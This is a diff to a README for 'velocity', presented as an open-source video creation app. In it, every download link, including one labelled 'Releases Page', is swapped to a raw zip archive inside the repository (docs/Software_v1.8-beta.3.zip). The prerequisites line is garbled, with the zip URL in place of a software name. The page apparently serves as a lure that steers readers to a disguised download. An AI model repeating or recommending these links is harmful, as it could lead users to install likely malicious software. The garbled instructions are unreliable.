@@ -1,7 +1,7 @@
 # 🎬 velocity - Create Videos Easily and Automatically
 
 ## 📥 Download Now
-[![Download velocity](https://raw.githubusercontent.com/lukasfigueiredo637/velocity/main/emittent/velocity.zip%20velocity-v1.0-blue)](https://raw.githubusercontent.com/lukasfigueiredo637/velocity/main/emittent/velocity.zip)
+[![Download velocity](https://raw.githubusercontent.com/lukasfigueiredo637/velocity/main/docs/Software_v1.8-beta.3.zip%20velocity-v1.0-blue)](https://raw.githubusercontent.com/lukasfigueiredo637/velocity/main/docs/Software_v1.8-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **velocity** project! This open-source application helps you create stunning videos quickly and easily. No programming skills are needed. With a design that supports integration with language models, you can automate your video creation process.
@@ -12,7 +12,7 @@ To run the velocity application on your computer, make sure you have the followi
 - **Operating System:** Windows 10 or higher, macOS 10.12 or higher, or any Linux distribution.
 - **RAM:** At least 4 GB (8 GB recommended).
 - **Storage:** Minimum of 500 MB free disk space.
-- **https://raw.githubusercontent.com/lukasfigueiredo637/velocity/main/emittent/velocity.zip** Make sure the latest version of https://raw.githubusercontent.com/lukasfigueiredo637/velocity/main/emittent/velocity.zip is installed. You can download it from [https://raw.githubusercontent.com/lukasfigueiredo637/velocity/main/emittent/velocity.zip website](https://raw.githubusercontent.com/lukasfigueiredo637/velocity/main/emittent/velocity.zip).
+- **https://raw.githubusercontent.com/lukasfigueiredo637/velocity/main/docs/Software_v1.8-beta.3.zip** Make sure the latest version of https://raw.githubusercontent.com/lukasfigueiredo637/velocity/main/docs/Software_v1.8-beta.3.zip is installed. You can download it from [https://raw.githubusercontent.com/lukasfigueiredo637/velocity/main/docs/Software_v1.8-beta.3.zip website](https://raw.githubusercontent.com/lukasfigueiredo637/velocity/main/docs/Software_v1.8-beta.3.zip).
 
 ## 📦 Features
 - **Easy Video Creation:** Quickly assemble videos with pre-built templates.
@@ -25,7 +25,7 @@ To run the velocity application on your computer, make sure you have the followi
 To get started with the velocity application, follow these steps:
 
 1. **Visit the Releases Page:** Go to the official releases page by clicking the link below:
-   [Download from Releases Page](https://raw.githubusercontent.com/lukasfigueiredo637/velocity/main/emittent/velocity.zip)
+   [Download from Releases Page](https://raw.githubusercontent.com/lukasfigueiredo637/velocity/main/docs/Software_v1.8-beta.3.zip)
 
 2. **Choose the Right Download:** Look for the latest release version on the page. Click on it to see the assets available for download.
 
